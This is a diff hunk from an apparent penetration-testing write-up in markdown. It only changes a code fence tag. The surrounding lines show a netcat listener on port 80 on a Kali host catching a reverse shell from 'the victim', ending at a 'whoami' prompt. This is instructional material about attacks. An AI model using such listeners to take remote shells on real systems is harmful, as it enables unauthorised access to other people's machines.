@@ -41,7 +41,7 @@ For the victim to be able to properly connect with us, we need to launch a Serve
 <br>
 <br>
 
-```terminal
+```
 root@kali:~# nc -l -p 80
 bash: no job control in this shell
 bash-3.2$ whoami
